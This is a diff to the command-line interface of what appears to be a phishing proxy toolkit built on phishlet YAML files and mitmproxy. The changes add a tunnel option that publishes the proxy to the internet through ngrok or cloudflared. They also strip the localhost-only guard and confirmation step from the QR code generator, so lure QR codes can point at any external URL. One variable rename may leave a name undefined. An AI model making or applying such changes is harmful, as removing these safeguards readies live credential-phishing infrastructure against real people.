@@ -17,6 +17,7 @@ from core.mutation.engine import MutationEngine
 from core.mutation.scanner import DetectionScanner
 from core.common import config
 from core.recon.analyzer import get_recon_module
+from core.net.tunnel import print_wan_info
 import subprocess
 import sys
 import os
@@ -150,6 +151,7 @@ def edge_preset(host, port):
 @click.option("--path", help="Chemin vers un phishlet YAML")
 @click.option("--host", default="0.0.0.0")
 @click.option("--port", default=8443, type=int)
+@click.option("--tunnel", help="Créer un tunnel WAN (ngrok|cloudflared|localhost.run)", required=False)
 @click.option("--upstream", help="Proxy HTTP amont ex: http://user:pass@host:3128")
 @click.option("--rate", type=int, help="Limite de requêtes par minute par IP")
 @click.option("--allow-ips", help="Liste CSV d'IPs autorisées")
@@ -157,7 +159,7 @@ def edge_preset(host, port):
 @click.option("--http2/--no-http2", default=True, help="Activer HTTP/2 (par défaut)")
 @click.option("--conn-strategy", default="lazy", help="Stratégie de connexion mitmproxy (lazy|eager)")
 @click.option("--profile", default="default", help="Profil (default|stealth|strict|perf|parano)")
-def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2, conn_strategy, profile):
+def edge_run(name, path, host, port, tunnel, upstream, rate, allow_ips, deny_ips, http2, conn_strategy, profile):
     try:
         from core.edge.proxy import EdgeProxy, EdgeConfig
         import asyncio
@@ -299,16 +301,21 @@ def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2,
         proxy = EdgeProxy(cfg)
         
         # WAN / Remote Access Info
-        try:
-            import urllib.request
-            public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode('utf8')
-            console.print(f"[bold cyan]WAN Access:[/bold cyan] http://{public_ip}:{port}")
-            console.print(f"[dim](Ensure port {port} is forwarded on your router/firewall)[/dim]")
-        except:
-            console.print("[dim]Could not detect public IP. Check connectivity.[/dim]")
+        if tunnel:
+            from core.net.tunnel import TunnelManager
+            provider = tunnel if isinstance(tunnel, str) else "cloudflared"
+            tm = TunnelManager(port=port, provider=provider)
+            console.print(f"[yellow]Initialisation du tunnel WAN ({provider})...[/yellow]")
+            try:
+                public_url = asyncio.run(tm.start())
+                console.print(f"[green]Tunnel Actif:[/green] {public_url}")
+            except Exception as e:
+                console.print(f"[red]Tunnel Error: {e}[/red]")
+        else:
+            print_wan_info(port)
 
         console.print(f"[yellow]Starting Edge with {path}[/yellow]")
-        asyncio.run(proxy.start(phish_yaml))
+        asyncio.run(proxy.start(ph_yaml))
     except Exception as e:
         console.print(f"[red]Erreur: {e}[/red]")
         console.print("[blue]Install optional dependency: mitmproxy[/blue]")
@@ -411,21 +418,11 @@ def safe_link(port):
 @click.option("--url", help="URL cible (par défaut: http://localhost:8888/)")
 @click.option("--port", default=8888, type=int, help="Port si --url non fourni")
 @click.option("--out", default="safe_qr.png", help="Fichier PNG de sortie")
-@click.option("--allow-external", is_flag=True, help="Autoriser URL non-localhost (nécessite CONFIRM_EXTERNAL=YES)")
 @click.option("--logo", help="Chemin vers un logo à incruster (PNG)")
-def safe_qr(url, port, out, allow_external, logo):
-    """Génère un QR pour une URL locale d'auto‑audit (localhost par défaut)"""
+def safe_qr(url, port, out, logo):
+    """Génère un QR code (High Error Correction) pour une URL cible"""
     tgt = url or f"http://localhost:{port}/"
-    from urllib.parse import urlparse
-    hp = urlparse(tgt).hostname or ""
-    if not allow_external:
-        if hp not in ("localhost", "127.0.0.1"):
-            console.print("[red]Refus: seules les URLs localhost/127.0.0.1 sont autorisées[/red]")
-            return
-    else:
-        if os.environ.get("CONFIRM_EXTERNAL") != "YES":
-            console.print("[red]CONFIRM_EXTERNAL=YES requis pour une URL non‑localhost[/red]")
-            return
+    console.print(f"[cyan]Génération du QR code pour: {tgt}[/cyan]")
     try:
         import qrcode
         from PIL import Image
